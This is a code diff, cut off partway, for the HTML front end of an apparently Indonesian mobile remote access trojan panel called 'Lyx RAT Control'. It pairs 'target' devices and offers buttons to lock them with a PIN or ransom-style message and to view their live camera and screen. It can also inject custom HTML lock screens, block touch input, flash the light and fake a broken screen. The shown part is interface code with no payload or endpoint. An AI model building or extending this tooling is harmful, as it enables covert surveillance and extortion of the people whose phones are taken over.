@@ -2,115 +2,292 @@
 <html lang="id">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>RAT CONTROL PANEL</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Lyx RAT Control</title>
 <style>
-* { margin:0; padding:0; box-sizing:border-box; font-family:'Segoe UI',sans-serif; }
-body { background:#0a0a0a; color:#0f0; min-height:100vh; padding:20px; }
-.container { max-width:1200px; margin:0 auto; }
-.header { text-align:center; padding:20px; border:1px solid #0f0; border-radius:10px; margin-bottom:20px; background:#000; box-shadow:0 0 20px #0f0; }
-.header h1 { color:#0f0; font-size:2em; letter-spacing:5px; text-shadow:0 0 10px #0f0; }
-.header p { color:#080; margin-top:5px; font-size:0.9em; }
+* { margin:0; padding:0; box-sizing:border-box; font-family:-apple-system,'Segoe UI',sans-serif; -webkit-tap-highlight-color:transparent; }
+html, body { width:100%; min-height:100vh; overflow-x:hidden; background:#0a0a0a; color:#0f0; }
+body { padding:15px; padding-bottom:40px; }
 
-.section { border:1px solid #0f0; border-radius:10px; padding:20px; margin-bottom:20px; background:#000; box-shadow:0 0 15px rgba(0,255,0,0.2); }
-.section h2 { color:#0f0; margin-bottom:15px; font-size:1.2em; border-bottom:1px solid #0f0; padding-bottom:10px; }
+/* ========== GLOBAL ========== */
+.container { max-width:900px; margin:0 auto; }
+.hidden { display:none !important; }
 
-.pairing-box { display:flex; gap:10px; align-items:center; flex-wrap:wrap; }
-.code-display { flex:1; background:#111; border:1px solid #0f0; padding:15px; border-radius:5px; font-family:monospace; font-size:1.5em; color:#0f0; text-align:center; letter-spacing:3px; min-width:200px; }
-.btn { background:#0f0; color:#000; border:none; padding:12px 20px; border-radius:5px; cursor:pointer; font-weight:bold; transition:0.3s; text-transform:uppercase; font-size:0.85em; }
-.btn:hover { background:#0a0; box-shadow:0 0 15px #0f0; }
-.btn-danger { background:#f00; color:#fff; }
-.btn-danger:hover { background:#a00; box-shadow:0 0 15px #f00; }
+/* ========== HEADER ========== */
+.header {
+display:flex; align-items:center; justify-content:space-between;
+padding:15px; border:1px solid #0f0; border-radius:12px;
+background:#000; box-shadow:0 0 20px rgba(0,255,0,0.2); margin-bottom:15px;
+}
+.header-left { display:flex; align-items:center; gap:12px; }
+.header-left svg { width:32px; height:32px; }
+.header-title h1 { font-size:1.05em; color:#0f0; letter-spacing:2px; }
+.header-title p { font-size:0.7em; color:#080; margin-top:2px; }
+.header-status { display:flex; align-items:center; gap:6px; font-size:0.7em; color:#0f0; }
+.status-dot { width:8px; height:8px; background:#0f0; border-radius:50%; box-shadow:0 0 8px #0f0; animation:pulse 1.5s infinite; }
+@keyframes pulse { 0%,100%{opacity:1;} 50%{opacity:0.4;} }
+
+/* ========== PAGE HEADER (untuk fitur) ========== */
+.page-header {
+display:flex; align-items:center; justify-content:space-between;
+padding:12px 15px; border:1px solid #0f0; border-radius:12px;
+background:#000; margin-bottom:15px;
+}
+.page-title { display:flex; align-items:center; gap:10px; }
+.page-title svg { width:24px; height:24px; }
+.page-title h2 { font-size:0.95em; color:#0f0; letter-spacing:1px; }
+.back-btn {
+width:38px; height:38px; border:1px solid #0f0; background:#111;
+border-radius:8px; display:flex; align-items:center; justify-content:center;
+cursor:pointer; transition:0.2s;
+}
+.back-btn:active { background:#0f0; }
+.back-btn svg { width:18px; height:18px; stroke:#0f0; }
+.back-btn:active svg { stroke:#000; }
+
+/* ========== BUTTONS ========== */
+.btn {
+padding:12px 18px; background:#0f0; color:#000; border:none;
+border-radius:8px; font-weight:bold; cursor:pointer; transition:0.2s;
+text-transform:uppercase; font-size:0.85em; letter-spacing:1px;
+}
+.btn:active { transform:scale(0.96); }
+.btn-blue { background:#0080ff; color:#fff; }
+.btn-blue:active { background:#0050a0; }
+.btn-red { background:#f00; color:#fff; }
 .btn-warn { background:#ff0; color:#000; }
-.btn-warn:hover { background:#aa0; box-shadow:0 0 15px #ff0; }
-.btn-blue { background:#00f; color:#fff; }
-.btn-blue:hover { background:#008; box-shadow:0 0 15px #00f; }
+.btn-outline { background:transparent; color:#0f0; border:1px solid #0f0; }
 
-.device-list { display:grid; gap:10px; }
-.device-item { display:flex; justify-content:space-between; align-items:center; background:#111; border:1px solid #0f0; padding:15px; border-radius:5px; flex-wrap:wrap; gap:10px; }
-.device-info { display:flex; align-items:center; gap:10px; }
-.device-icon { width:40px; height:40px; border:1px solid #0f0; border-radius:5px; display:flex; align-items:center; justify-content:center; }
-.device-name { color:#0f0; font-weight:bold; }
-.device-status { font-size:0.8em; color:#080; }
-.online { color:#0f0; }
-.offline { color:#f00; }
+/* ========== TOGGLE SWITCH (BIRU KAYA GAMBAR) ========== */
+.toggle-row {
+display:flex; align-items:center; justify-content:space-between;
+padding:15px; background:#111; border:1px solid #0f0; border-radius:10px;
+margin-bottom:15px;
+}
+.toggle-label { color:#0f0; font-size:0.9em; }
+.toggle-label small { display:block; color:#080; font-size:0.75em; margin-top:3px; }
+.switch { position:relative; display:inline-block; width:52px; height:28px; flex-shrink:0; }
+.switch input { opacity:0; width:0; height:0; }
+.slider-sw {
+position:absolute; cursor:pointer; inset:0; background:#333;
+transition:0.3s; border-radius:28px;
+}
+.slider-sw:before {
+position:absolute; content:""; height:20px; width:20px; left:4px; bottom:4px;
+background:#fff; transition:0.3s; border-radius:50%;
+box-shadow:0 2px 4px rgba(0,0,0,0.3);
+}
+.switch input:checked + .slider-sw { background:#0080ff; }
+.switch input:checked + .slider-sw:before { transform:translateX(24px); }
+.switch input:checked + .slider-sw { box-shadow:0 0 12px rgba(0,128,255,0.6); }
 
-.dashboard { display:none; }
-.dashboard.active { display:block; }
+/* ========== FORM INPUT ========== */
+.form-group { margin-bottom:15px; }
+.form-group label {
+display:block; color:#0f0; font-size:0.85em; margin-bottom:8px;
+letter-spacing:1px; text-transform:uppercase;
+}
+.form-group input, .form-group textarea, .form-group select {
+width:100%; padding:12px; background:#111; border:1px solid #0f0;
+color:#0f0; border-radius:8px; font-family:monospace; font-size:0.9em;
+outline:none; transition:0.2s;
+}
+.form-group input:focus, .form-group textarea:focus, .form-group select:focus {
+border-color:#0f0; box-shadow:0 0 10px rgba(0,255,0,0.4);
+}
+.form-group textarea { min-height:140px; resize:vertical; }
+.form-group select { cursor:pointer; }
 
-.feature-grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(280px,1fr)); gap:15px; }
-.feature-card { border:1px solid #0f0; border-radius:10px; padding:20px; background:#111; transition:0.3s; cursor:pointer; }
-.feature-card:hover { background:#1a1a1a; box-shadow:0 0 20px rgba(0,255,0,0.5); transform:translateY(-3px); }
-.feature-card .icon-box { width:50px; height:50px; border:2px solid #0f0; border-radius:10px; display:flex; align-items:center; justify-content:center; margin-bottom:10px; }
-.feature-card h3 { color:#0f0; font-size:1em; margin-bottom:5px; }
-.feature-card p { color:#080; font-size:0.8em; }
+/* ========== DEVICE LIST ========== */
+.device-item {
+display:flex; justify-content:space-between; align-items:center;
+background:#111; border:1px solid #0f0; padding:14px; border-radius:10px;
+margin-bottom:10px; gap:10px; flex-wrap:wrap;
+}
+.device-info { display:flex; align-items:center; gap:12px; flex:1; min-width:200px; }
+.device-icon {
+width:42px; height:42px; border:1px solid #0f0; border-radius:8px;
+display:flex; align-items:center; justify-content:center; flex-shrink:0;
+}
+.device-icon svg { width:22px; height:22px; }
+.device-name { color:#0f0; font-weight:bold; font-size:0.9em; }
+.device-meta { font-size:0.72em; color:#080; margin-top:3px; }
+.device-meta .online { color:#0f0; }
+.device-meta .offline { color:#f00; }
+.device-actions { display:flex; gap:8px; }
+.device-actions .btn { padding:9px 14px; font-size:0.75em; }
 
-.modal { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.9); z-index:1000; justify-content:center; align-items:center; padding:20px; }
-.modal.active { display:flex; }
-.modal-content { background:#000; border:1px solid #0f0; border-radius:10px; padding:25px; max-width:600px; width:100%; box-shadow:0 0 30px #0f0; max-height:90vh; overflow-y:auto; }
-.modal-content h2 { color:#0f0; margin-bottom:15px; }
-.modal-content label { display:block; color:#0f0; margin:10px 0 5px; font-size:0.9em; }
-.modal-content input, .modal-content textarea, .modal-content select { width:100%; padding:10px; background:#111; border:1px solid #0f0; color:#0f0; border-radius:5px; font-family:monospace; }
-.modal-content textarea { min-height:120px; resize:vertical; }
-.modal-actions { display:flex; gap:10px; margin-top:20px; flex-wrap:wrap; }
+/* ========== PAIRING SECTION ========== */
+.pairing-box {
+display:flex; gap:10px; align-items:center; flex-wrap:wrap;
+padding:15px; background:#111; border:1px solid #0f0; border-radius:10px;
+}
+.code-display {
+flex:1; background:#000; border:1px solid #0f0; padding:14px;
+border-radius:8px; font-family:monospace; font-size:1.4em;
+color:#0f0; text-align:center; letter-spacing:4px; min-width:200px;
+text-shadow:0 0 10px #0f0;
+}
 
-.toggle { position:relative; display:inline-block; width:50px; height:26px; }
-.toggle input { opacity:0; width:0; height:0; }
-.slider { position:absolute; cursor:pointer; top:0; left:0; right:0; bottom:0; background:#333; transition:0.3s; border-radius:26px; }
-.slider:before { position:absolute; content:""; height:18px; width:18px; left:4px; bottom:4px; background:#fff; transition:0.3s; border-radius:50%; }
-input:checked + .slider { background:#0f0; }
-input:checked + .slider:before { transform:translateX(24px); }
+/* ========== FEATURE GRID ========== */
+.feature-grid {
+display:grid; grid-template-columns:repeat(auto-fill,minmax(150px,1fr));
+gap:12px;
+}
+.feature-card {
+border:1px solid #0f0; border-radius:10px; padding:16px;
+background:#111; cursor:pointer; transition:0.25s;
+position:relative; overflow:hidden;
+}
+.feature-card:active { transform:scale(0.97); background:#1a1a1a; }
+.feature-card .icon-box {
+width:44px; height:44px; border:2px solid #0f0; border-radius:10px;
+display:flex; align-items:center; justify-content:center; margin-bottom:10px;
+}
+.feature-card .icon-box svg { width:22px; height:22px; }
+.feature-card h3 { color:#0f0; font-size:0.85em; margin-bottom:4px; letter-spacing:1px; }
+.feature-card p { color:#080; font-size:0.7em; line-height:1.3; }
 
-.cam-view, .screen-view { width:100%; background:#111; border:1px solid #0f0; border-radius:5px; display:flex; align-items:center; justify-content:center; color:#080; min-height:200px; font-family:monospace; }
+/* ========== SECTION ========== */
+.section {
+border:1px solid #0f0; border-radius:12px; padding:15px;
+margin-bottom:15px; background:#000;
+}
+.section-title {
+color:#0f0; font-size:0.9em; margin-bottom:12px;
+letter-spacing:2px; text-transform:uppercase;
+display:flex; align-items:center; gap:8px;
+}
+.section-title svg { width:16px; height:16px; }
 
-.log-box { background:#111; border:1px solid #0f0; border-radius:5px; padding:10px; font-family:monospace; font-size:0.8em; max-height:200px; overflow-y:auto; color:#0f0; }
-.log-box .log-line { margin-bottom:3px; }
-.log-box .log-time { color:#080; }
+/* ========== CAMERA VIEW ========== */
+.cam-view {
+width:100%; aspect-ratio:4/3; background:#111; border:1px solid #0f0;
+border-radius:10px; display:flex; align-items:center; justify-content:center;
+color:#080; font-family:monospace; font-size:0.85em; margin-bottom:15px;
+overflow:hidden; position:relative;
+}
+.cam-view img { width:100%; height:100%; object-fit:cover; display:none; }
+.cam-view.live img { display:block; }
+.cam-view.live .placeholder { display:none; }
+.cam-view .live-badge {
+position:absolute; top:10px; left:10px; background:rgba(0,0,0,0.8);
+color:#f00; padding:4px 10px; border-radius:4px; font-size:0.7em;
+font-family:monospace; display:none;
+}
+.cam-view.live .live-badge { display:block; }
+
+/* ========== SCREEN VIEW ========== */
+.screen-view {
+width:100%; aspect-ratio:9/16; max-width:280px; margin:0 auto 15px;
+background:#111; border:1px solid #0f0; border-radius:10px;
+display:flex; align-items:center; justify-content:center;
+color:#080; font-family:monospace; font-size:0.85em;
+overflow:hidden; position:relative;
+}
+.screen-view img { width:100%; height:100%; object-fit:cover; display:none; }
+.screen-view.live img { display:block; }
+.screen-view.live .placeholder { display:none; }
+
+/* ========== LOG ========== */
+.log-box {
+background:#000; border:1px solid #0f0; border-radius:8px;
+padding:10px; font-family:monospace; font-size:0.72em;
+max-height:180px; overflow-y:auto; color:#0f0;
+}
+.log-line { margin-bottom:3px; }
+.log-time { color:#080; }
+
+/* ========== TOAST ========== */
+#toast {
+position:fixed; bottom:20px; left:50%; transform:translateX(-50%) translateY(100px);
+background:#0f0; color:#000; padding:12px 20px; border-radius:8px;
+font-size:0.85em; font-weight:bold; z-index:100000; transition:0.3s;
+box-shadow:0 0 20px rgba(0,255,0,0.5);
+}
+#toast.show { transform:translateX(-50%) translateY(0); }
+#toast.error { background:#f00; color:#fff; }
 </style>
 </head>
 <body>
+
 <div class="container">
 
-<!-- HEADER -->
+<!-- ============================================ -->
+<!-- PAGE: HOME -->
+<!-- ============================================ -->
+<div id="page-home">
 <div class="header">
-<svg width="60" height="60" viewBox="0 0 24 24" fill="none" stroke="#0f0" stroke-width="1.5" style="margin-bottom:10px;">
+<div class="header-left">
+<svg viewBox="0 0 24 24" fill="none" stroke="#0f0" stroke-width="1.5">
 <rect x="2" y="3" width="20" height="14" rx="2"/>
 <line x1="8" y1="21" x2="16" y2="21"/>
 <line x1="12" y1="17" x2="12" y2="21"/>
 <circle cx="12" cy="10" r="2"/>
 </svg>
-<h1>RAT CONTROL PANEL</h1>
-<p>Remote Access Terminal // Secure Connection</p>
+<div class="header-title">
+<h1>LYX RAT CONTROL</h1>
+<p>Remote Access Terminal v2.0</p>
+</div>
+</div>
+<div class="header-status">
+<div class="status-dot"></div>
+<span id="connStatus">ONLINE</span>
+</div>
 </div>
 
-<!-- PAIRING SECTION -->
+<!-- PAIRING -->
 <div class="section">
-<h2>PAIRING CODE</h2>
+<div class="section-title">
+<svg viewBox="0 0 24 24" fill="none" stroke="#0f0" stroke-width="2">
+<path d="M12 2L2 7l10 5 10-5-10-5z"/>
+</svg>
+PAIRING CODE
+</div>
 <div class="pairing-box">
 <div class="code-display" id="pairingCode">---- ---- ----</div>
 <button class="btn" onclick="generateCode()">GENERATE</button>
 <button class="btn btn-blue" onclick="copyCode()">COPY</button>
 </div>
-<p style="color:#080;margin-top:10px;font-size:0.8em;">Masukkan kode ini ke aplikasi target untuk pairing device</p>
 </div>
 
 <!-- DEVICE LIST -->
 <div class="section">
-<h2>DEVICE LIST</h2>
-<div class="device-list" id="deviceList">
-<p style="color:#080;font-size:0.9em;">Belum ada device terpairing...</p>
+<div class="section-title">
+<svg viewBox="0 0 24 24" fill="none" stroke="#0f0" stroke-width="2">
+<rect x="5" y="2" width="14" height="20" rx="2"/>
+</svg>
+DEVICE LIST
+</div>
+<div id="deviceList">
+<p style="color:#080;font-size:0.85em;text-align:center;padding:20px;">Belum ada device terpairing...</p>
+</div>
 </div>
 </div>
 
-<!-- DASHBOARD -->
-<div class="dashboard" id="dashboard">
-<div class="section">
-<h2>DASHBOARD // <span id="dashDeviceName" style="color:#0f0;"></span></h2>
+<!-- ============================================ -->
+<!-- PAGE: DASHBOARD -->
+<!-- ============================================ -->
+<div id="page-dashboard" class="hidden">
+<div class="page-header">
+<div class="page-title">
+<svg viewBox="0 0 24 24" fill="none" stroke="#0f0" stroke-width="2">
+<rect x="2" y="3" width="20" height="14" rx="2"/>
+<circle cx="12" cy="10" r="2"/>
+</svg>
+<h2 id="dashTitle">DASHBOARD</h2>
+</div>
+<button class="back-btn" onclick="showPage('home')">
+<svg viewBox="0 0 24 24" fill="none" stroke-width="2.5" stroke-linecap="round">
+<path d="M19 12H5M12 19l-7-7 7-7"/>
+</svg>
+</button>
+</div>
+
 <div class="feature-grid">
-
-<div class="feature-card" onclick="openModal('modalLock')">
+<div class="feature-card" onclick="showPage('lock')">
 <div class="icon-box">
-<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#0f0" stroke-width="2">
+<svg viewBox="0 0 24 24" fill="none" stroke="#0f0" stroke-width="2">
 <rect x="3" y="11" width="18" height="11" rx="2"/>
 <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
 </svg>
@@ -119,21 +296,21 @@ input:checked + .slider:before { transform:translateX(24px); }
 <p>Kunci target dengan PIN</p>
 </div>
 
-<div class="feature-card" onclick="openModal('modalLockMsg')">
+<div class="feature-card" onclick="showPage('lockmsg')">
 <div class="icon-box">
-<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#0f0" stroke-width="2">
+<svg viewBox="0 0 24 24" fill="none" stroke="#0f0" stroke-width="2">
 <rect x="3" y="11" width="18" height="11" rx="2"/>
 <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
 <line x1="12" y1="15" x2="12" y2="17"/>
 </svg>
 </div>
-<h3>LOCK + MESSAGE</h3>
+<h3>LOCK + MSG</h3>
 <p>Kunci + tampilkan pesan</p>
 </div>
 
-<div class="feature-card" onclick="openModal('modalCamera')">
+<div class="feature-card" onclick="showPage('camera')">
 <div class="icon-box">
-<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#0f0" stroke-width="2">
+<svg viewBox="0 0 24 24" fill="none" stroke="#0f0" stroke-width="2">
 <path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"/>
 <circle cx="12" cy="13" r="4"/>
 </svg>
@@ -142,20 +319,20 @@ input:checked + .slider:before { transform:translateX(24px); }
 <p>Lihat kamera target</p>
 </div>
 
-<div class="feature-card" onclick="openModal('modalCustomHtml')">
+<div class="feature-card" onclick="showPage('customhtml')">
 <div class="icon-box">
-<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#0f0" stroke-width="2">
+<svg viewBox="0 0 24 24" fill="none" stroke="#0f0" stroke-width="2">
 <polyline points="16 18 22 12 16 6"/>
 <polyline points="8 6 2 12 8 18"/>
 </svg>
 </div>
-<h3>CUSTOM HTML LOCK</h3>
-<p>Lock dengan HTML custom</p>
+<h3>CUSTOM HTML</h3>
+<p>Lock HTML custom</p>
 </div>
 
-<div class="feature-card" onclick="openModal('modalStrobe')">
+<div class="feature-card" onclick="showPage('strobe')">
 <div class="icon-box">
-<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#0f0" stroke-width="2">
+<svg viewBox="0 0 24 24" fill="none" stroke="#0f0" stroke-width="2">
 <circle cx="12" cy="12" r="5"/>
 <line x1="12" y1="1" x2="12" y2="3"/>
 <line x1="12" y1="21" x2="12" y2="23"/>
@@ -163,17 +340,15 @@ input:checked + .slider:before { transform:translateX(24px); }
 <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/>
 <line x1="1" y1="12" x2="3" y2="12"/>
 <line x1="21" y1="12" x2="23" y2="12"/>
-<line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/>
-<line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/>
 </svg>
 </div>
-<h3>STROBE / SENTER</h3>
-<p>Kedipkan lampu target</p>
+<h3>STROBE</h3>
+<p>Kedipkan senter</p>
 </div>
 
-<div class="feature-card" onclick="openModal('modalScreen')">
+<div class="feature-card" onclick="showPage('screen')">
 <div class="icon-box">
-<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#0f0" stroke-width="2">
+<svg viewBox="0 0 24 24" fill="none" stroke="#0f0" stroke-width="2">
 <rect x="2" y="3" width="20" height="14" rx="2"/>
 <line x1="8" y1="21" x2="16" y2="21"/>
 <line x1="12" y1="17" x2="12" y2="21"/>
@@ -183,9 +358,9 @@ input:checked + .slider:before { transform:translateX(24px); }
 <p>Lihat layar target</p>
 </div>
 
-<div class="feature-card" onclick="openModal('modalBlockTouch')">
+<div class="feature-card" onclick="showPage('blocktouch')">
 <div class="icon-box">
-<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#0f0" stroke-width="2">
+<svg viewBox="0 0 24 24" fill="none" stroke="#0f0" stroke-width="2">
 <path d="M18 11V6a2 2 0 0 0-4 0v5"/>
 <path d="M14 10V4a2 2 0 0 0-4 0v6"/>
 <path d="M10 10.5V6a2 2 0 0 0-4 0v8"/>
@@ -193,142 +368,339 @@ input:checked + .slider:before { transform:translateX(24px); }
 </svg>
 </div>
 <h3>BLOCK TOUCH</h3>
-<p>Bekukan layar target</p>
+<p>Bekukan layar</p>
 </div>
 
-<div class="feature-card" onclick="openModal('modalLcd')">
+<div class="feature-card" onclick="showPage('lcd')">
 <div class="icon-box">
-<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#0f0" stroke-width="2">
+<svg viewBox="0 0 24 24" fill="none" stroke="#0f0" stroke-width="2">
 <rect x="2" y="3" width="20" height="14" rx="2"/>
 <line x1="2" y1="8" x2="22" y2="8"/>
 <line x1="2" y1="12" x2="22" y2="12"/>
-<line x1="5" y1="5" x2="8" y2="5"/>
 </svg>
 </div>
 <h3>LCD EFFECT</h3>
 <p>Efek layar rusak</p>
 </div>
-
-</div>
 </div>
 </div>
 
-</div>
-
-<!-- MODAL LOCK -->
-<div class="modal" id="modalLock">
-<div class="modal-content">
+<!-- ============================================ -->
+<!-- PAGE: LOCK -->
+<!-- ============================================ -->
+<div id="page-lock" class="hidden">
+<div class="page-header">
+<div class="page-title">
+<svg viewBox="0 0 24 24" fill="none" stroke="#0f0" stroke-width="2">
+<rect x="3" y="11" width="18" height="11" rx="2"/>
+<path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+</svg>
 <h2>LOCK DEVICE</h2>
+</div>
+<button class="back-btn" onclick="showPage('dashboard')">
+<svg viewBox="0 0 24 24" fill="none" stroke-width="2.5" stroke-linecap="round">
+<path d="M19 12H5M12 19l-7-7 7-7"/>
+</svg>
+</button>
+</div>
+
+<div class="toggle-row">
+<div class="toggle-label">
+Aktifkan Fitur
+<small>Status: <span id="lockStatus">OFF</span></small>
+</div>
+<label class="switch">
+<input type="checkbox" id="lockToggle" onchange="updateStatus('lockStatus', this.checked)">
+<span class="slider-sw"></span>
+</label>
+</div>
+
+<div class="form-group">
 <label>PIN (4-8 digit)</label>
-<input type="text" id="lockPin" placeholder="Masukkan PIN" maxlength="8">
-<label>Aktifkan Fitur</label>
-<label class="toggle"><input type="checkbox" id="lockToggle"><span class="slider"></span></label>
-<div class="modal-actions">
-<button class="btn" onclick="sendCommand('LOCK', {pin: document.getElementById('lockPin').value, active: document.getElementById('lockToggle').checked})">KIRIM</button>
-<button class="btn btn-danger" onclick="closeModal('modalLock')">TUTUP</button>
-</div>
-</div>
+<input type="text" id="lockPin" placeholder="Masukkan PIN" maxlength="8" inputmode="numeric">
 </div>
 
-<!-- MODAL LOCK MSG -->
-<div class="modal" id="modalLockMsg">
-<div class="modal-content">
+<button class="btn" style="width:100%;" onclick="sendCmd('LOCK', {pin: document.getElementById('lockPin').value, active: document.getElementById('lockToggle').checked})">KIRIM COMMAND</button>
+</div>
+
+<!-- ============================================ -->
+<!-- PAGE: LOCK + MSG -->
+<!-- ============================================ -->
+<div id="page-lockmsg" class="hidden">
+<div class="page-header">
+<div class="page-title">
+<svg viewBox="0 0 24 24" fill="none" stroke="#0f0" stroke-width="2">
+<rect x="3" y="11" width="18" height="11" rx="2"/>
+<path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+</svg>
 <h2>LOCK + MESSAGE</h2>
-<label>PIN</label>
-<input type="text" id="lockMsgPin" placeholder="Masukkan PIN" maxlength="8">
-<label>Pesan untuk target</label>
-<textarea id="lockMsgText" placeholder="Tulis pesan..."></textarea>
-<label>Aktifkan Fitur</label>
-<label class="toggle"><input type="checkbox" id="lockMsgToggle"><span class="slider"></span></label>
-<div class="modal-actions">
-<button class="btn" onclick="sendCommand('LOCK_MSG', {pin: document.getElementById('lockMsgPin').value, msg: document.getElementById('lockMsgText').value, active: document.getElementById('lockMsgToggle').checked})">KIRIM</button>
-<button class="btn btn-danger" onclick="closeModal('modalLockMsg')">TUTUP</button>
 </div>
-</div>
+<button class="back-btn" onclick="showPage('dashboard')">
+<svg viewBox="0 0 24 24" fill="none" stroke-width="2.5" stroke-linecap="round">
+<path d="M19 12H5M12 19l-7-7 7-7"/>
+</svg>
+</button>
 </div>
 
-<!-- MODAL CAMERA -->
-<div class="modal" id="modalCamera">
-<div class="modal-content">
+<div class="toggle-row">
+<div class="toggle-label">
+Aktifkan Fitur
+<small>Status: <span id="lockMsgStatus">OFF</span></small>
+</div>
+<label class="switch">
+<input type="checkbox" id="lockMsgToggle" onchange="updateStatus('lockMsgStatus', this.checked)">
+<span class="slider-sw"></span>
+</label>
+</div>
+
+<div class="form-group">
+<label>PIN</label>
+<input type="text" id="lockMsgPin" placeholder="Masukkan PIN" maxlength="8" inputmode="numeric">
+</div>
+
+<div class="form-group">
+<label>Pesan untuk Target</label>
+<textarea id="lockMsgText" placeholder="Tulis pesan..."></textarea>
+</div>
+
+<button class="btn" style="width:100%;" onclick="sendCmd('LOCK_MSG', {pin: document.getElementById('lockMsgPin').value, msg: document.getElementById('lockMsgText').value, active: document.getElementById('lockMsgToggle').checked})">KIRIM COMMAND</button>
+</div>
+
+<!-- ============================================ -->
+<!-- PAGE: CAMERA -->
+<!-- ============================================ -->
+<div id="page-camera" class="hidden">
+<div class="page-header">
+<div class="page-title">
+<svg viewBox="0 0 24 24" fill="none" stroke="#0f0" stroke-width="2">
+<path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"/>
+<circle cx="12" cy="13" r="4"/>
+</svg>
 <h2>LIVE CAMERA</h2>
-<div class="cam-view" id="camView">[ CAMERA FEED OFFLINE ]</div>
+</div>
+<button class="back-btn" onclick="showPage('dashboard')">
+<svg viewBox="0 0 24 24" fill="none" stroke-width="2.5" stroke-linecap="round">
+<path d="M19 12H5M12 19l-7-7 7-7"/>
+</svg>
+</button>
+</div>
+
+<div class="toggle-row">
+<div class="toggle-label">
+Aktifkan Fitur
+<small>Status: <span id="cameraStatus">OFF</span></small>
+</div>
+<label class="switch">
+<input type="checkbox" id="cameraToggle" onchange="updateStatus('cameraStatus', this.checked)">
+<span class="slider-sw"></span>
+</label>
+</div>
+
+<div class="cam-view" id="camView">
+<div class="placeholder">[ CAMERA FEED OFFLINE ]</div>
+<div class="live-badge">● LIVE</div>
+<img id="camFrame" alt="camera">
+</div>
+
+<div class="form-group">
 <label>Pilih Kamera</label>
 <select id="camSelect">
 <option value="front">Kamera Depan</option>
 <option value="back">Kamera Belakang</option>
 </select>
-<label>Aktifkan Fitur</label>
-<label class="toggle"><input type="checkbox" id="camToggle"><span class="slider"></span></label>
-<div class="modal-actions">
-<button class="btn" onclick="sendCommand('CAMERA', {cam: document.getElementById('camSelect').value, active: document.getElementById('camToggle').checked})">KIRIM</button>
-<button class="btn btn-danger" onclick="closeModal('modalCamera')">TUTUP</button>
-</div>
-</div>
 </div>
 
-<!-- MODAL CUSTOM HTML -->
-<div class="modal" id="modalCustomHtml">
-<div class="modal-content">
-<h2>CUSTOM HTML LOCK</h2>
+<button class="btn" style="width:100%;" onclick="sendCmd('CAMERA', {cam: document.getElementById('camSelect').value, active: document.getElementById('cameraToggle').checked})">KIRIM COMMAND</button>
+</div>
+
+<!-- ============================================ -->
+<!-- PAGE: CUSTOM HTML -->
+<!-- ============================================ -->
+<div id="page-customhtml" class="hidden">
+<div class="page-header">
+<div class="page-title">
+<svg viewBox="0 0 24 24" fill="none" stroke="#0f0" stroke-width="2">
+<polyline points="16 18 22 12 16 6"/>
+<polyline points="8 6 2 12 8 18"/>
+</svg>
+<h2>CUSTOM HTML</h2>
+</div>
+<button class="back-btn" onclick="showPage('dashboard')">
+<svg viewBox="0 0 24 24" fill="none" stroke-width="2.5" stroke-linecap="round">
+<path d="M19 12H5M12 19l-7-7 7-7"/>
+</svg>
+</button>
+</div>
+
+<div class="toggle-row">
+<div class="toggle-label">
+Aktifkan Fitur
+<small>Status: <span id="customHtmlStatus">OFF</span></small>
+</div>
+<label class="switch">
+<input type="checkbox" id="customHtmlToggle" onchange="updateStatus('customHtmlStatus', this.checked)">
+<span class="slider-sw"></span>
+</label>
+</div>
+
+<div class="form-group">
 <label>Kode HTML</label>
-<textarea id="customHtml" placeholder="<h1>Contoh</h1>"></textarea>
-<label>Aktifkan Fitur</label>
-<label class="toggle"><input type="checkbox" id="customHtmlToggle"><span class="slider"></span></label>
-<div class="modal-actions">
-<button class="btn" onclick="sendCommand('CUSTOM_HTML', {html: document.getElementById('customHtml').value, active: document.getElementById('customHtmlToggle').checked})">KIRIM</button>
-<button class="btn btn-danger" onclick="closeModal('modalCustomHtml')">TUTUP</button>
-</div>
-</div>
+<textarea id="customHtmlText" placeholder="&lt;h1&gt;Contoh&lt;/h1&gt;"></textarea>
 </div>
 
-<!-- MODAL STROBE -->
-<div class="modal" id="modalStrobe">
-<div class="modal-content">
+<button class="btn" style="width:100%;" onclick="sendCmd('CUSTOM_HTML', {html: document.getElementById('customHtmlText').value, active: document.getElementById('customHtmlToggle').checked})">KIRIM COMMAND</button>
+</div>
+
+<!-- ============================================ -->
+<!-- PAGE: STROBE -->
+<!-- ============================================ -->
+<div id="page-strobe" class="hidden">
+<div class="page-header">
+<div class="page-title">
+<svg viewBox="0 0 24 24" fill="none" stroke="#0f0" stroke-width="2">
+<circle cx="12" cy="12" r="5"/>
+<line x1="12" y1="1" x2="12" y2="3"/>
+<line x1="12" y1="21" x2="12" y2="23"/>
+<line x1="1" y1="12" x2="3" y2="12"/>
+<line x1="21" y1="12" x2="23" y2="12"/>
+</svg>
 <h2>STROBE / SENTER</h2>
+</div>
+<button class="back-btn" onclick="showPage('dashboard')">
+<svg viewBox="0 0 24 24" fill="none" stroke-width="2.5" stroke-linecap="round">
+<path d="M19 12H5M12 19l-7-7 7-7"/>
+</svg>
+</button>
+</div>
+
+<div class="toggle-row">
+<div class="toggle-label">
